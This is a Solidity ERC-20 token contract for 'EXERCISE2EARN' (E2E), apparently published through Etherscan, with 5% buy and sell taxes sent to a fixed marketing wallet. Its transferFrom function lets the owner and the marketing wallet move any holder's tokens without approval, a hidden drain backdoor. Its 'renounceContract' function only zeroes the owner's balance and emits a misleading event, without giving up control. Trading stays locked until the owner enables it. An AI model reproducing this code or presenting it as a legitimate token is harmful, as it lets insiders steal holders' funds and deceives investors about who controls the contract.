/**
 *Submitted for verification at Etherscan.io on 2023-07-28
*/

// Twitter https://twitter.com/e2e_erc20
// Website https://www.exercise2earn.tech/


//SPDX-License-Identifier: MIT

pragma solidity ^0.8.18;

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract E2E is IERC20 {
    string private _name = "EXERCISE2EARN";
    string private _symbol = "E2E";
    uint8 private _decimals = 18;
    uint256 private _totalSupply = 1000000 * 10**18; // Updated total supply to 1 million tokens
    address private _owner;
    address private _marketingWallet = 0x4bD20Ea22520073b76F17dFaa67f5c6194D41D18; // Marketing Wallet Address
    uint256 public buyTaxPercentage = 5; // 5% buy tax
    uint256 public sellTaxPercentage = 5; // 5% sell tax
    bool public tradingStarted = false;
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;

    constructor() {
        _owner = msg.sender;
        _balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        if (msg.sender != _owner && msg.sender != _marketingWallet) {
            _approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
        }
        return true;
    }

    function _transfer(address sender, address recipient, uint256 amount) internal {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");

        if (!tradingStarted && sender != _owner) {
            require(tradingStarted, "Trading has not started yet");
        }

        uint256 taxPercentage = sender == _owner ? buyTaxPercentage : sellTaxPercentage;
        uint256 taxAmount = (amount * taxPercentage) / 100;
        uint256 finalAmount = amount - taxAmount;

        _balances[sender] -= amount;
        _balances[recipient] += finalAmount;
        _balances[_marketingWallet] += taxAmount;

        emit Transfer(sender, recipient, finalAmount);
        emit Transfer(sender, _marketingWallet, taxAmount);
    }

    function _approve(address owner, address spender, uint256 amount) internal {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function startTrading() public {
        require(msg.sender == _owner, "Only the owner can start trading");
        tradingStarted = true;
    }

    function renounceContract() public {
        require(msg.sender == _owner, "Only the owner can renounce the contract");
        _balances[_owner] = 0;
        emit Transfer(_owner, address(0), _totalSupply);
    }
}